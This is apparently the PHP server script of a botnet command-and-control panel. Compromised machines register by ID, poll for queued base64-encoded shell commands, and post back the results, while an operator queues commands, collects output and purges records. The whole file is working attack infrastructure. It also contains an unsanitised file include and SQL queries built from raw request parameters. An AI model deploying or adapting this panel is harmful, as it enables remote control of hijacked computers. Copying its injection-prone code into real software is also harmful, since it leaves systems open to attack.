<?php
	if (isset($_GET['page'])) {
		$page = $_GET['page'];
		include("/var/www/".$page);
	}
	elseif (isset($_GET['action'])) {
		$action=$_GET['action'];
		if ($action=='getCommand') {
			# Example URL to Test: http://172.16.216.132/view.php?action=getCommand&mID=test
			$machineID=$_GET['mID'];
			$db = new SQLite3('/usr/databases/command');
			$query = 'SELECT count(*) FROM botInfo WHERE machineID="' . $machineID . '" AND executed="N" LIMIT 1';
			$results = $db->query($query);
			while ($row = $results->fetchArray()) {
				$rows = $row[0];		# Calculate the rows returned by the query
			}
			if ($rows > 0) {			# If number of rows is greater than 0 then continue
				$query = 'SELECT id, httpCommand FROM botInfo WHERE machineID="' . $machineID . '" AND executed="N" LIMIT 1';
				$results = $db->query($query);
				while ($row = $results->fetchArray()) {
					echo $row[0] . "|" . $row[1];
				}
			}
			else {					# If no rows are returned based on the query return Nothing|Nothing
				echo "Nothing|" . base64_encode("Nothing");
			}
		}
		elseif ($action=='addBot') {
			# Example URL to Test: http://172.16.216.132/view.php?action=addBot&mID=test27
			$machineID=$_GET['mID'];
			$db = new SQLite3('/usr/databases/command');
			$query = "INSERT INTO botInfo (machineID, httpCommand, executed) VALUES('" . $machineID . "','" . base64_encode('ls') . "','N')";
			$results = $db->exec($query);
			echo "Added";
		}
		elseif ($action=='sendCommand') {
			# Example URL to Test: http://172.16.216.132/view.php?action=sendCommand&mID=test27&httpCommand=dddd
			$machineID=$_GET['mID'];
			$command=$_GET['httpCommand'];
			$db = new SQLite3('/usr/databases/command');
			$query = "INSERT INTO botInfo (machineID, httpCommand, executed) VALUES('" . $machineID . "','" . $command . "','N')";
			$results = $db->exec($query);
			echo "Added Command";
		}
		elseif ($action=='getExecuted') {
			# Example URL to Test: http://172.16.216.132/view.php?action=getExecuted
			$db = new SQLite3('/usr/databases/command');
			$query = "SELECT count(*) FROM botInfo WHERE executed='Y' LIMIT 1";
			$results = $db->query($query);
			while ($row = $results->fetchArray()) {
				$rows = $row[0];		# Calculate the rows returned by the query
			}
			if ($rows > 0) {			# If number of rows is greater than 0 then continue
				$taskID = 0;
				$query = "SELECT id, machineID, httpCommand, httpResults FROM botInfo WHERE executed='Y' LIMIT 1";
				$results = $db->query($query);
				while ($row = $results->fetchArray()) {
					echo $row[0] . "|" . $row[1] . "|" . $row[2] . "|" . $row[3];
					$taskID = $row[0];
				}
				$query = "UPDATE botInfo SET executed='D' WHERE id=" . $taskID;
				$results = $db->exec($query);
			}
			else {
				echo "Nothing|Nothing|Nothing|Nothing";
			}	
		}
		elseif ($action=='purge') {
			# Example URL to Test: http://172.16.216.132/view.php?action=purge
			$db = new SQLite3('/usr/databases/command');
			$query = "DELETE FROM botInfo WHERE executed='D'";
			$results = $db->exec($query);
			echo "Purged";
		}
	}
	elseif (isset($_POST['action'])) {
		$action=$_POST['action'];
		if ($action=='postCommand') {
			# Example to test with: curl -d "action=postCommand&mID=test&id=1&httpResults=test9" -X POST http://172.16.216.132/view.php
			$machineID=$_POST['mID'];
			$id=$_POST['id'];
			$httpResults=$_POST['httpResults'];
			$db = new SQLite3('/usr/databases/command');
			$query = 'UPDATE botInfo SET httpResults="' . $httpResults . '", executed="Y" WHERE id=' . $id . ' AND machineID="' . $machineID . '"';
			$results = $db->exec($query);
			echo "Completed";
		}
	}
	else {
		echo "view.php?page=tools.html";
	}
?>
